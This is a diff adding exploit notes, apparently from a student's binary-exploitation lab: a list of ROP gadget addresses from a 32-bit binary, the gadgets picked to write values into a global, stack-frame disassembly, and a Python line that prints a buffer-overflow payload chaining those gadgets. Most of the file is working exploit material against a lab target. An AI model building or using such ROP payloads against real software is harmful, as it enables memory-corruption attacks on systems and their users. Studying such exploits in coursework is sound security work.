@@ -1,0 +1,68 @@
+0x080dfa87 : add al, 2 ; inc edi ; ret
+0x08049533 : xor eax, eax ; ret
+0x080672b6 : lea eax, [edx + 1] ; ret
+0x0806718c : lea eax, [edx + 2] ; pop edi ; ret
+0x080672cc : lea eax, [edx + 2] ; ret
+0x080670a4 : lea eax, [edx + 3] ; pop edi ; ret
+0x080672d4 : lea eax, [edx + 3] ; ret
+0x0808f325 : lea eax, [edx + 3] ; test ebx, ebx ; jne 0x808f300 ; pop ebx ; ret
+0x080a2917 : lea eax, [edx + 4] ; mov dword ptr [esp + 4], eax ; jmp 0x80a2797
+0x080671aa : lea eax, [edx + 4] ; pop edi ; ret
+0x080672ea : lea eax, [edx + 4] ; ret
+0x080671bc : lea eax, [edx + 5] ; pop edi ; ret
+0x080672fc : lea eax, [edx + 5] ; ret
+0x080671da : lea eax, [edx + 6] ; pop edi ; ret
+0x0806730a : lea eax, [edx + 6] ; ret
+
+
+### these three should do the job
+
+0x0806c71e : imul eax, edx ; jmp 0x806c57b 
+0x0805bf42 : pop edx ; ret
+0x080672b4 : mov dword ptr [edx], eax ; lea eax, [edx + 1] ; ret
+
+0x080b8376 : pop eax ; ret 
+
+0x0806c57b <+235>:   add    esp,0x1c
+0x0806c57e <+238>:   pop    ebx
+0x0806c57f <+239>:   pop    esi
+0x0806c580 <+240>:   pop    edi
+0x0806c581 <+241>:   pop    ebp
+0x0806c582 <+242>:   ret
+
+
+0x080eba20 = &glb
+
+0x0804899d  = location to jump in main
+print(b"A"*14)
+print( b"A\n"*1175 +
+       b"\x42\n\xbf\n\x05\n\x08\n" +
+       b"\x05\n\x00\n\x00\n\x00\n" +
+       b"\xb6\n\x72\n\x06\n\x08\n" +
+       b"\x1e\n\xc7\n\x06\n\x08\n" +
+       b"A\n"*44 +
+       b"\x42\n\xbf\n\x05\n\x08\n" +
+       b"\x04\n\x00\n\x00\n\x00\n" +
+       b"\xb6\n\x72\n\x06\n\x08\n" +
+       b"\x1e\n\xc7\n\x06\n\x08\n" +
+       b"A\n"*44 +
+       b"\x42\n\xbf\n\x05\n\x08\n" +
+       b"\x03\n\x00\n\x00\n\x00\n" +
+       b"\xb6\n\x72\n\x06\n\x08\n" +
+       b"\x1e\n\xc7\n\x06\n\x08\n" +
+       b"A\n"*44 +
+       b"\x42\n\xbf\n\x05\n\x08\n" +
+       b"\x02\n\x00\n\x00\n\x00\n" +
+       b"\xb6\n\x72\n\x06\n\x08\n" +
+       b"\x1e\n\xc7\n\x06\n\x08\n" +
+       b"A\n"*44 +
+       b"\x42\n\xbf\n\x05\n\x08\n" +
+       b"\x20\n\xba\n\x0e\n\x08\n" +
+       b"\xb4\n\x72\n\x06\n\x08\n"
+)
+0xffffd458 : ebp of main
+0x080483ca : pop ebp ; ret
+0x804e4f0 <exit>
+
+0x80ea068 : address of the first roll number
+CS18B040 43 53 31 38 42 30 34 30
